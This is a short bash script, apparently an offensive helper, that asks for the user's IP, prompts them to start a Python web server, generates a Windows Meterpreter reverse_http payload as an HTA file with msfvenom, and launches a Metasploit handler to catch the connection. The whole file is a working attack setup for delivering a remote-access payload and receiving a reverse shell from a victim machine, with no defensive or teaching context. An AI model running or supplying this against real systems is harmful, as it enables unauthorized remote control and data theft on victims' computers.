#!/bin/bash
echo "[+] what is your IP"
ifconfig eth0
read ipaddr

echo "[+] Copy the following command, you will need to run this in a new terminal tab or terminal window"
echo "python3 -m http.server 8080"
echo "[+] Did you copy the command? If yes, press enter to continue"
read abc

msfvenom -p windows/meterpreter/reverse_http LHOST=$ipaddr LPORT=8000 -f hta-psh | tee -a payload.hta
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_http;set LHOST $ipaddr; set LPORT 8000; run"
